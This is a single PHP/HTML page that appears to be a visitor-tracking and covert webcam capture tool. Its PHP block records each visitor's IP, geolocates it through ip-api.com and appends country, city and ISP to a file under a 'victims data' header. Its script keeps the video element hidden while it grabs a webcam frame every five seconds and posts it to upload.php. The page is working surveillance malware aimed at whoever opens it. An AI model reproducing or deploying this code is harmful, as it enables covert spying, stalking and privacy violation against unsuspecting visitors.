<?php 
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } elseif (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Get the visitor's IP
$ip = getUserIP();

// Add date/time for clarity (optional)
$date = date("Y-m-d H:i:s");
$log = "$date - $ip" . PHP_EOL;

// Save to file
// file_put_contents("ips.txt", $log, FILE_APPEND);


// Skip localhost
if ($ip === '::1') {
    $ip = '8.8.8.8'; // Google's public IP for testing
}

$response = file_get_contents("http://ip-api.com/json/$ip");
$data = json_decode($response, true);

$victimIP = "victim :".$log;
if ($data['status'] === 'success') {
    $country = "\n"."Country :".$data['country']."\n";
    $region = "region".$data['regionName']."\n";
    $city = "city".$data['city']."\n";
    $isp = "isp".$data['isp']."\n";
  $Intro = " --------------------- victims data ----------------------------"."\n";

    // file management
    $file = fopen("ips.txt", "a");

// Write multiple data

fwrite($file, $Intro);
fwrite($file, $victimIP);
fwrite($file, $country);
fwrite($file, $region);
fwrite($file, $city);
fwrite($file, $isp);

// Close the file
fclose($file);
    // echo "Location: $city, $region, $country <br>";
    // echo "ISP: $isp <br>";
    // echo "IP: $ip";
} else {
    // echo "Could not fetch location.";
}




// Show something to the visitor (optional)
// echo "Your IP has been logged. ✅";
?>




<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Auto Capture Loop</title>
  <style>
    video, img {
      width: 300px;
      border: 2px solid #333;
      margin-top: 10px;
      display: none;
    }
  </style>
</head>
<body>
  <h2>Looping Webcam Capture & Upload</h2>

  <video id="video" autoplay></video>
  <canvas id="canvas" style="display: none;"></canvas>
  <!-- <img id="snapshot" alt="Captured Image"/> -->

  <script>



    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    // const snapshot = document.getElementById('snapshot');

    // Access the webcam
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        // Start capturing repeatedly
        setInterval(() => {
          captureAndUpload();
        }, 5000); // Every 5 seconds
      })
      .catch(err => {
        console.error('Camera access denied:', err);
      });

    function captureAndUpload() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      const imageData = canvas.toDataURL('image/png');
      // snapshot.src = imageData;

      // Send data to PHP using fetch (no form needed)
      fetch('upload.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'imageData=' + encodeURIComponent(imageData)
      })
      .then(res => res.text())
      .then(data => {
        console.log(data); // Optional: print PHP response
      });
    }
  </script>
</body>
</html>
